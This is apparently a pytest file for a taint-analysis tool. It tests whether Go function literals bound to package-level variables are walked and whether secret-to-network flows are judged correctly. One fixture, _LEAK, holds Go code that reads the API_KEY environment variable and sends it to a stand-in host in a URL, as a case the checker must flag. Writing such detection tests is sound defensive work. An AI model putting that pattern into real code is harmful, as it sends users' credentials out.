# SPDX-License-Identifier: AGPL-3.0-or-later
"""A Go function literal under a package-level ``var`` is walked by the DDG (WI-rovun).

INV-nopoh anchored every call under a package-level ``var`` on the variable's
own symbol (kind ``variable``, span = the ``var_spec``): cobra's ``Run:
func(cmd, args) {...}`` handlers, ``var handler = func(...) {...}``. The Go DDG
spec walked ``function_declaration`` and ``method_declaration`` only, so no CFG
was built for those bodies, the variable id never entered ``ddg_symbols``, and
every taint flow anchored there read ``structural`` -- on beads, 29 of 29 such
rows. The cost is a false VIOLATED: the same body that is refuted as a
declaration is reported when it is bound to a package-level var.

ONE HOME FOR THE NAME (WI-mufag). The DDG does not rebuild the variable's name
or kind; ``var_spec`` is a ``bound_callable_node_types`` entry, walked only under
the analyzer's own id at its exact span, with ``bound_bodies_for`` naming the
literal bodies the binding holds.
"""
from __future__ import annotations

import contextlib
import io
import json
from pathlib import Path
from typing import Any

import pytest
import tree_sitter
from tree_sitter_language_pack import get_language

from hypergumbo_core import dataflow_scope
from hypergumbo_core.cli import main
from hypergumbo_core.ddg_build import RepoDdg, analyzer_symbol_index, build_repo_ddg
from hypergumbo_lang_mainstream.go import analyze_go
from hypergumbo_lang_mainstream.go_def_use import _go_bound_literal_bodies

_FIXTURE = """package main

import (
\t"fmt"
\t"os"
)

type Command struct {
\tRun  func(args []string)
\tPre  func()
\tArgs func() int
}

func exact(n int) func() int { return nil }

var rootCmd = &Command{
\tRun: func(args []string) {
\t\tx := os.Getenv("A")
\t\tfmt.Println(x, args)
\t},
}

var twoCmd = &Command{
\tPre: func() {
\t\ty := os.Getenv("B")
\t\tfmt.Println(y)
\t},
\tRun: func(args []string) {
\t\tz := os.Getenv("C")
\t\tfmt.Println(z)
\t},
}

var argsCmd = &Command{
\tArgs: exact(1),
\tRun: func(args []string) {
\t\tw := os.Getenv("D")
\t\tfmt.Println(w)
\t},
}

var (
\tgrouped = func() {
\t\tg := os.Getenv("E")
\t\tfmt.Println(g)
\t}
)

var logger = fmt.Sprint(os.Getenv("F"))

func helper() {
\tvar local = func() {
\t\tl := os.Getenv("G")
\t\tfmt.Println(l)
\t}
\th := os.Getenv("H")
\tfmt.Println(h)
\tlocal()
}
"""


def _relative(node: dict[str, Any], prefix: str) -> dict[str, Any]:
    """The survey hands the DDG repo-relative paths; ``analyze_go`` on an
    absolute root does not, so normalise both slots the index reads."""
    return {
        **node,
        "id": node["id"].replace(prefix, "", 1),
        "path": node["path"].replace(prefix, "", 1),
    }


def _arms(tmp_path: Path) -> tuple[RepoDdg, dict[str, str]]:
    root = tmp_path / "proj"
    root.mkdir()
    (root / "main.go").write_text(_FIXTURE)
    # Registration is an import side effect; an empty registry would make every
    # assertion below vacuously true.
    assert dataflow_scope.ensure_def_use_extractors_registered()
    prefix = f"{root}/"
    nodes = [_relative(s.to_dict(), prefix) for s in analyze_go(root).symbols]
    ddg = build_repo_ddg(root, ("go",), analyzer_symbol_index(nodes))
    by_name = {n["name"]: n["id"] for n in nodes}
    return ddg, by_name


def test_the_fixture_reaches_the_machinery(tmp_path: Path) -> None:
    """REACH FIRST: the analyzer anchors the literals on variables, and the
    declared function is walked as it always was (its local ``var`` literal is
    part of its own CFG, not a binding of its own)."""
    ddg, ids = _arms(tmp_path)
    assert ids["rootCmd"].endswith(":rootCmd:variable")
    assert ids["helper"] in ddg.ddg_symbols


def test_a_package_level_literal_is_walked_under_the_variable_id(tmp_path: Path) -> None:
    ddg, ids = _arms(tmp_path)
    for name in ("rootCmd", "twoCmd", "argsCmd", "grouped"):
        assert ids[name] in ddg.ddg_symbols, name


def test_the_ddg_invents_no_key_the_analyzer_never_produces(tmp_path: Path) -> None:
    ddg, ids = _arms(tmp_path)
    assert ddg.ddg_symbols <= set(ids.values())


def test_a_data_variable_with_no_literal_is_not_walked(tmp_path: Path) -> None:
    """THE CONTROL: admitting ``variable`` into the index does not make a plain
    initializer a walked callable."""
    ddg, ids = _arms(tmp_path)
    assert ids["logger"] not in ddg.ddg_symbols


def test_the_literal_body_carries_its_own_edges(tmp_path: Path) -> None:
    """``x`` defined at line 18 reaches its use at 19, under rootCmd's id. A
    literal's parameters (``args``) are not definitions, exactly as a
    declaration's are not: the CFG is built over the body in both cases."""
    ddg, ids = _arms(tmp_path)
    edges = {
        (e.variable, e.def_line, e.use_line)
        for e in ddg.ddg_edges if e.symbol_id == ids["rootCmd"]
    }
    assert ("x", 18, 19) in edges


def test_refutation_forfeits_exactly_where_the_walk_cannot_see_everything(
    tmp_path: Path,
) -> None:
    """``twoCmd`` binds two literals (two functions to the program: a value
    crossing between them is a cross-function flow), and ``argsCmd`` runs
    ``exact(1)`` outside any literal. One literal and nothing else keeps it."""
    ddg, ids = _arms(tmp_path)
    assert ids["twoCmd"] in ddg.forfeit_refutation
    assert ids["argsCmd"] in ddg.forfeit_refutation
    assert ids["rootCmd"] not in ddg.forfeit_refutation
    assert ids["grouped"] not in ddg.forfeit_refutation


def _var_spec(src: bytes) -> Any:
    parser = tree_sitter.Parser(get_language("go"))
    stack = [parser.parse(src).root_node]
    while stack:
        node = stack.pop()
        if node.type == "var_spec":
            return node
        stack.extend(reversed(node.children))
    raise AssertionError("fixture has no var_spec")  # pragma: no cover


class TestBoundLiteralBodies:
    def test_a_nested_literal_belongs_to_its_outer_body(self) -> None:
        """Only OUTERMOST literals: an inner one is part of the outer body's CFG,
        and walking it again would record its statements twice."""
        src = b"package m\nvar n = func() {\n\tgo func() { h() }()\n}\n"
        bodies = _go_bound_literal_bodies(_var_spec(src), src)
        assert [b.start_point[0] + 1 for b in bodies] == [2]

    def test_a_local_var_spec_holds_no_bound_bodies(self) -> None:
        """A ``var`` inside a function is a LOCAL (INV-sidab): its literal is part
        of the enclosing function's CFG, never a binding of its own."""
        src = b"package m\nfunc f() {\n\tvar l = func() { h() }\n\tl()\n}\n"
        assert _go_bound_literal_bodies(_var_spec(src), src) == []

    def test_bodies_come_back_in_source_order(self) -> None:
        src = b"package m\nvar a, b = func() {\n\tp()\n}, func() {\n\tq()\n}\n"
        bodies = _go_bound_literal_bodies(_var_spec(src), src)
        assert [b.start_point[0] + 1 for b in bodies] == [2, 4]


# ---------------------------------------------------------------------------
# The behaviour the item is about, through the shipped CLI.
# ---------------------------------------------------------------------------

_CLAIMS = (
    "claims:\n  - id: C\n    text: t\n    constraint:\n      taint_flow:\n"
    "        source_taint: host_secret\n        prohibited_sink_zone: network\n"
)
_HEAD = (
    'package main\n\nimport (\n\t"fmt"\n\t"net/http"\n\t"os"\n)\n\n'
    'var url = "https://x.example/"\nvar _ = fmt.Sprint\n\n'
    "type Command struct {\n\tRun func(args []string)\n}\n\n"
)
#: The key IS sent.
_LEAK = '\tk := os.Getenv("API_KEY")\n\thttp.Get("https://x.example/?k=" + k)\n'
#: The key is read, only its length is printed, and the request sends no secret.
_NO_LEAK = '\tk := os.Getenv("API_KEY")\n\tfmt.Println(len(k))\n\thttp.Get(url)\n'
_SHAPES = {
    "declaration": "func handler(args []string) {{\n{body}}}\n",
    "var_literal": "var handler = func(args []string) {{\n{body}}}\n",
    "cobra_field": "var rootCmd = &Command{{\n\tRun: func(args []string) {{\n{body}\t}},\n}}\n",
}


def _verdict(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, text: str) -> dict:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "main.go").write_text(_HEAD + text)
    claims = tmp_path / "claims.yaml"
    claims.write_text(_CLAIMS)
    monkeypatch.setenv("XDG_CACHE_HOME", str(tmp_path / "cache"))
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(io.StringIO()):
        main(["verify-claims", str(repo), "--claims", str(claims), "--format", "json"])
    (verdict,) = json.loads(buf.getvalue())["verdicts"]
    return verdict


@pytest.mark.parametrize("shape", sorted(_SHAPES))
def test_a_real_leak_is_confirmed_by_the_walk(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, shape: str,
) -> None:
    verdict = _verdict(tmp_path, monkeypatch, _SHAPES[shape].format(body=_LEAK))
    assert verdict["verdict"] == "violated", verdict["details"]
    assert {e["analysis_method"] for e in verdict["evidence"]} == {"ddg"}, verdict["evidence"]


@pytest.mark.parametrize("shape", sorted(_SHAPES))
def test_no_leak_is_no_finding_whatever_the_binding(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, shape: str,
) -> None:
    """THE ITEM'S FALSE POSITIVE: bound to a package-level var, this read
    VIOLATED (structural); as a declaration the walk refutes it."""
    verdict = _verdict(tmp_path, monkeypatch, _SHAPES[shape].format(body=_NO_LEAK))
    assert verdict["verdict"] != "violated", verdict["evidence"]
    assert verdict["evidence"] == []
